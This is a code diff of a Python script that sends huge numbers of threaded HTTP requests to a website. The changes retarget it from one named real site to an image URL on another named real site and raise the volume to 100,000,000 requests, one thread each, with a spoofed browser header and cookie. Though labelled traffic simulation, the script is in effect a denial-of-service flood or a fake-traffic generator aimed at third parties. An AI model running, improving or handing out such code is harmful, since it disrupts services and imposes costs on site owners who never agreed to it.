@@ -2,47 +2,34 @@ import requests
 import threading
 
 # URL of the website you want to send traffic to
-url = 'http://e-planner.somee.com/'
+url = 'https://iptv-nederland.com/wp-content/uploads/al_opt_content/IMAGE/iptv-nederland.com//wp-content/uploads/2023/07/nominados-mejor-poster-2019-josssy-1200x752-1.webp.bv.webp?bv_host=iptv-nederland.com'
 
-# Number of requests to send
-total_requests = 200000
-
-# Number of threads to use
-num_threads = 10
+# Number of visits you want to simulate
+number_of_visits = 100000000
 
 # Define the headers with a User-Agent
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
-    'Cookie': 'ASP.NET_SessionId=5yw2viasdasuyh405usdasdm0145azpj0w;b=b'
+    'Cookie': 'hcdn=Caused'
 }
 
-# Counter to keep track of the number of completed requests
-lock = threading.Lock()
-requests_sent = 0
 
-def send_request():
-    global requests_sent
-    while True:
-        with lock:
-            if requests_sent >= total_requests:
-                break
-            request_num = requests_sent + 1
-            requests_sent += 1
-        
-        try:
-            # Make the request with the User-Agent header
-            response = requests.get(url, headers=headers)
-            if response.status_code == 200:
-                print(f"Request {request_num}: Success")
-            else:
-                print(f"Request {request_num}: Failed with status code {response.status_code}")
-        except Exception as e:
-            print(f"Request {request_num}: Failed with exception {e}")
+
+def send_request(visit_number):
+    try:
+        # Make the request with the User-Agent header
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            print(f"Visit {visit_number}: Success")
+        else:
+            print(f"Visit {visit_number}: Failed with status code {response.status_code}")
+    except Exception as e:
+        print(f"Visit {visit_number}: Failed with exception {e}")
 
 def simulate_traffic():
     threads = []
-    for _ in range(num_threads):
-        thread = threading.Thread(target=send_request)
+    for i in range(number_of_visits):
+        thread = threading.Thread(target=send_request, args=(i + 1,))
         threads.append(thread)
         thread.start()
 
